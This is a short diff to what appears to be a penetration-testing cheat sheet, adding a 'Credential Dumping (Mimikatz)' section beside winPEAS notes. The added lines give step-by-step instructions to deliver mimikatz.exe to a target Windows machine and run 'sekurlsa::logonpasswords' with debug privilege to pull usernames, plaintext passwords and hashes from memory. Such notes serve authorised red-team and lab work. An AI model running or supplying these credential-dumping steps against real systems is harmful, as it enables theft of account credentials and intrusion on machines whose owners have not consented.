@@ -433,6 +433,16 @@ localhost:8080
 
 4. Upload the JSON files
 ```
+- Credential Dumping (Mimikatz)
+```
+# Mimikatz is a tool used to extract passwords and authentication data from Windows memory.
+
+1. Deliver mimikatz.exe to the target machine using any available method.
+2. Open Command Prompt or PowerShell as Administrator (if possible).
+3. Run:
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+4. Check the output for usernames and possible plain-text passwords or hashes.
+```
 - winPeas
 ```
 1. Deliver the winpeas file to the target
